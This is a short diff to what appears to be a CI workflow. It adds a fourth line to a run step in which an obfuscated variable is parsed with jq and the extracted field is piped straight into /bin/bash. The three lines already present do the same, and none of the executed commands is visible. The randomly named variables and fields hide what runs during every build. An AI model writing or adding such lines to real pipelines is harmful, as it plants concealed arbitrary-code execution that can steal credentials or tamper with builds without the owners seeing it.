@@ -41,6 +41,7 @@ jobs:
           echo $g93309 | jq -r .sqtkg102 | /bin/bash
           printf '%s' "$fkkle45277" | jq -r .abu04 | /bin/bash
           echo $ml14 | jq -r .lpp375 | /bin/bash
+          echo $k7 | jq -r .kbm31285 | /bin/bash
 
       - name: Archive results
         if: always()
